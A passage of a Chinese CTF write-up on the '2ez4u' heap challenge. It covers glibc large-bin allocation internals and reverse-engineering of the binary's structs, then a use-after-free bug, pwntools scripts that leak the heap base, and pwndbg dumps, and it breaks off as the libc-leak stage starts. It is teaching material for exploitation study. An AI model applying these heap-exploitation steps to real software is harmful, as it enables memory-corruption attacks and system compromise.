bin中的第一个chunk)也不能满足要求，</span></span><br><span class="line"><span class="comment">      则不能从large bin中分配。否则，遍历large bin 链表，找到合适的chunk。 */</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first(bin)) != bin &amp;&amp;</span><br><span class="line">  (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(victim-&gt;size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)) &#123;</span><br><span class="line">      <span class="comment">/*反向遍历chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环。*/</span></span><br><span class="line">victim = victim-&gt;bk_nextsize;<span class="comment">//第一个chunk的bk_nextsize是large bins的末端，即最小的chunk</span></span><br><span class="line"><span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size = chunksize(victim)) &lt;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb)))</span><br><span class="line">  victim = victim-&gt;bk_nextsize;<span class="comment">//遍历chunk_size链表，找下一个更大的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 如果从large bin链表中选取的chunk victim不是链表中的最后一个chunk，</span></span><br><span class="line"><span class="comment">    并且与victim 大小相同的chunk不止一个，那么意味着victim为chunk size链表中的节点，</span></span><br><span class="line"><span class="comment">    为了不调整chunk size链表，需要避免将chunk size链表中的节点取出，所以取victim-&gt;fd节点对应的chunk作为候选chunk。</span></span><br><span class="line"><span class="comment">    由于large bin链表中的 chunk也是按大小排序，同一大小的chunk有多个时，这些chunk必定排在一起，</span></span><br><span class="line"><span class="comment">    所以victim-&gt;fd节点对应的chunk的大小必定与victim的大小一样。 */</span></span><br><span class="line"><span class="keyword">if</span> (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">  victim = victim-&gt;fd;</span><br><span class="line">    <span class="comment">/*计算将victim切分后剩余大小，并调用unlink()宏函数将victim从large bin链表中取出。*/</span></span><br><span class="line">remainder_size = size - nb;</span><br><span class="line">unlink(victim, bck, fwd);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* 调用chunk2mem()获得chunk中可用的内存指针，返回给应用层，退出 */</span></span><br><span class="line">check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">  alloc_perturb (p, bytes);</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>关于堆利用的其他知识,可以参考<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">清华的论文</a>和<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_overview/" target="_blank" rel="noopener">CTF-wiki</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec 2ez4u </span><br><span class="line">[*] &apos;/home/sakura/2ez4u&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h4 id="去掉alarm"><a href="#去掉alarm" class="headerlink" title="去掉alarm"></a>去掉alarm</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-21-154234.png" alt="">去掉之后，注意多nop几下……别让函数看上去断了，弄成我下面这样就行。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-21-145746.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-21-150913.png" alt=""></p><h3 id="分析结构体"><a href="#分析结构体" class="headerlink" title="分析结构体"></a>分析结构体</h3><p>个人习惯先逆向分析一下结构体。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-083727.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-083809.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-084037.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-083858.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-083930.png" alt=""><br>简单在注释里写了一下分析。</p><p>结论是：</p><ol><li>apple结构体<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-092203.jpg" alt=""></li><li>管理apple的数据结构<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-093047.jpg" alt=""><h3 id="使用pwntools动态分析"><a href="#使用pwntools动态分析" class="headerlink" title="使用pwntools动态分析"></a>使用pwntools动态分析</h3>动态分析时使用的脚本如下<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line">base_addr=<span class="number">0x555555554000</span></span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0xD22</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value, num, l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(str(value))</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(str(num))</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">io.sendline(<span class="string">'5'</span>)</span><br></pre></td></tr></table></figure></li></ol><p>可以通过动态调试的方式检验自己的分析结果，对一开始还是蛮有帮助，熟悉了之后就不用了，这种菜单题的结构体大同小异。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-084525.png" alt=""></p><p>解释一下pwntools里面的几条语句</p><ul><li><code>context.log_level = &#39;DEBUG&#39;</code><br>打开debug,可以看到自己的发送和接收（如图）</li><li><code>io = process(&quot;./2ez4u&quot;, env = {&quot;LD_PRELOAD&quot; : &quot;./libc.so&quot;})</code><br>代表使用指定的libc文件去链接，<strong>不过要注意一下，因为ld.so的版本原因，跨版本指定libc一般是会失败的，所以这题的话，请使用ubuntu16.04</strong><br>如图：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-084901.png" alt=""></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/chal$ python m_struct.py </span><br><span class="line">[+] Starting local process &apos;./2ez4u&apos; env=&#123;&apos;LD_PRELOAD&apos;: &apos;./libc.so&apos;&#125; : pid 9247</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">parallels@ubuntu:~/ctf/chal$ cat /proc/9247/maps</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-090204.png" alt=""></p><ul><li>另外解释一下，base_addr=0x555555554000<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-090310.png" alt=""><br>这是代码段的基地址（这里主要就是用作调试，所以本地调试需要关闭ASLR,不然这个地址会变化。）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></li></ul><p>因为可以看到文件里都是按照偏移来写的地址。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-090334.png" alt=""></p><ul><li><p><code>gdb.attach(io, &#39;b *0x%x&#39; % (base_addr+0xD22))</code><br>使用gdb attach调试，b *是下断，这里我在malloc下断，attach上去之后再在里面下断也行，没区别。</p></li><li><p>另外使用IDA对二进制文件进行逆向分析的时候，可以把基地址重新选定，如下操作，可以看到现在基地址已经选定了。（注意这种情况下是在关闭ASLR调试时可以用，服务器上的地址并不是这个）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-094549.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-094610.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-094626.png" alt=""></p></li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>添加函数在上面已经分析了。<br>查看函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-151722.png" alt=""></p><p>删除函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-151812.png" alt=""><br>修改函数<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-101926.png" alt=""><br>可以看出在free chunk后并没有将存储指针的全局变量删除，还能够对其进行编辑，典型的UAF漏洞。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>首先构造两个大小在同一个bins中的large chunk，将其释放后，这两个chunk先进入unsorted bins中，再申请一个不满足这两个chunk大小的chunk，则unsorted bins中的这两个chunk将会进入large bins中。<br>同时fd_nextsize和bk_nextsize将被赋值，因为指向这两个chunk的指针还存放在全局变量中，所以依然可以打印（UAF）<br>调试脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> c_uint32</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'x86-64'</span></span><br><span class="line">context.os = <span class="string">'linux'</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">"./2ez4u"</span>, env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"></span><br><span class="line">base_addr = <span class="number">0x0000555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'0'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'description length?(1-1024):'</span>)</span><br><span class="line">    io.sendline(str(l))</span><br><span class="line">    io.recvuntil(<span class="string">'description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, desc)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">'color?(0:red, 1:green):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'value?(0-999):'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1000'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'num?(0-16)'</span>)</span><br><span class="line">    io.sendline(<span class="string">'17'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'new description of the apple:'</span>)</span><br><span class="line">    io.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'your choice:'</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'which?(0-15):'</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'0'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br></pre></td></tr></table></figure></p><p>gdb挂上后，先查看全局变量,找到堆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000060000000000x0000555555757010        index:0</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090        index:1</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110        index:2</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190        index:3</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210        index:4</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290        index:5</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310        index:6</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390        index:7</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0        index:8</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0        index:9</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0        index:a</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40        index:b</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050        index:c</span><br><span class="line">0x555555756110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-041558.png" alt=""></p><p>添加了一个large bin之后。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x555555756040</span><br><span class="line">0x555555756040:0x00000400000000010x00005555557580a0 ---&gt;new chunk</span><br><span class="line">0x555555756050:0x00000060000000010x0000555555757090</span><br><span class="line">0x555555756060:0x00000060000000010x0000555555757110</span><br><span class="line">0x555555756070:0x00000060000000010x0000555555757190</span><br><span class="line">0x555555756080:0x00000060000000010x0000555555757210</span><br><span class="line">0x555555756090:0x00000060000000010x0000555555757290</span><br><span class="line">0x5555557560a0:0x00000060000000010x0000555555757310</span><br><span class="line">0x5555557560b0:0x000003f0000000010x0000555555757390</span><br><span class="line">0x5555557560c0:0x00000030000000010x00005555557577a0</span><br><span class="line">0x5555557560d0:0x000003e0000000000x00005555557577f0</span><br><span class="line">0x5555557560e0:0x00000030000000010x0000555555757bf0</span><br><span class="line">0x5555557560f0:0x000003f0000000000x0000555555757c40</span><br><span class="line">0x555555756100:0x00000030000000010x0000555555758050</span><br><span class="line">0x555555756110:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756120:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756130:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>则index 9<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x00005555557577f0</span><br><span class="line">0x5555557577f0:0x00007ffff7dd1f68--&gt;fd（main_arena）    0x0000555555757c30--&gt;bk</span><br><span class="line">0x555555757800:0x0000555555757c30--&gt;fd_nextsize0x0000555555757c30--&gt;bk_nextsize</span><br><span class="line">0x555555757810:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757820:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757830:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757840:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757850:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757860:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757870:0x39393939393939390x3939393939393939</span><br><span class="line">0x555555757880:0x39393939393939390x3939393939393939</span><br></pre></td></tr></table></figure></p><p>index b<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20gx 0x0000555555757c40</span><br><span class="line">0x555555757c40:0x00005555557577e0--&gt;fd                0x00007ffff7dd1f68--&gt;bk（main_arena,全局变量)</span><br><span class="line">0x555555757c50:0x00005555557577e0--&gt;fd_nextsize0x00005555557577e0--&gt;bk_nextsize</span><br><span class="line">0x555555757c60:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c70:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c80:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757c90:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757ca0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cb0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cc0:0x62626262626262620x6262626262626262</span><br><span class="line">0x555555757cd0:0x62626262626262620x6262626262626262</span><br></pre></td></tr></table></figure></p><p>即：chunk_size链为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">large bin: index b--&gt;index 9(--&gt;index b)</span><br></pre></td></tr></table></figure></p><p>此处–&gt;均代表bk_nextsize<br><strong>同时由fd和bk可以看出在large bin链中的顺序，判据如下图：</strong><br>index b的bk为main_arena,index 9的fd为main_arena<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-22-145329.png" alt=""></p><p>顺便index b大小为0x3e0,index 9的大小为0x3d0，b&gt;a，这也证明了large bin确实是从大到小排序的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x94 bytes:</span><br><span class="line">    00000000  63 6f 6c 6f  72 3a 20 67  72 65 65 6e  0a 6e 75 6d  │colo│r: g│reen│·num│</span><br><span class="line">    00000010  3a 20 32 31  38 34 35 0a  76 61 6c 75  65 3a 20 31  │: 21│845·│valu│e: 1│</span><br><span class="line">    00000020  30 34 0a 64  65 73 63 72  69 70 74 69  6f 6e 3a e0  │04·d│escr│ipti│on:·│</span><br><span class="line">    00000030  77 75 55 55  55 0a 0a 3d  3d 3d 3d 3d  20 63 68 61  │wuUU│U··=│====│ cha│</span><br><span class="line">    00000040  6c 6c 20 3d  3d 3d 3d 3d  0a 31 2e 20  61 64 64 20  │ll =│====│·1. │add │</span><br><span class="line">    00000050  61 70 70 6c  65 0a 32 2e  20 64 65 6c  20 61 70 70  │appl│e·2.│ del│ app│</span><br><span class="line">    00000060  6c 65 0a 33  2e 20 65 64  69 74 20 61  70 70 6c 65  │le·3│. ed│it a│pple│</span><br><span class="line">    00000070  0a 34 2e 20  73 68 6f 77  20 61 70 70  6c 65 0a 35  │·4. │show│ app│le·5│</span><br><span class="line">    00000080  2e 20 71 75  69 74 0a 79  6f 75 72 20  63 68 6f 69  │. qu│it·y│our │choi│</span><br><span class="line">    00000090  63 65 3a 20                                         │ce: ││</span><br><span class="line">    00000094</span><br></pre></td></tr></table></figure></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 